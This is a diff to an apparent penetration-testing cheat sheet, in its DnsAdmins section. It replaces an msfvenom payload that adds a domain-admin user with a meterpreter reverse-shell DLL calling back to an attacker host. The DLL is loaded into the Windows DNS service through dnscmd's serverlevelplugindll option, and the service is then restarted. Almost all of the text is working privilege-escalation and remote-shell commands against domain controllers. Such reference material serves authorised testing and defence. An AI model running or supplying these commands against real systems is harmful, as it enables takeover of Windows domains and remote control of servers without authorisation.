@@ -134,12 +134,12 @@ sc start AppReadiness
 ## DnsAdmins
 Create the revshell
 ```
-msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4242 -f dll -o reverseshell.dll
 ```
 
 Loading the revshell
 ```
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\reverseshell.dll
 ``` 
 
 Cheacking our permission
@@ -148,7 +148,7 @@ wmic useraccount where name="netadm" get sid
 sc.exe sdshow DNS
 ```
 
-Management service
+Management service (cmd)
 ```
 sc stop dns
 sc start dns
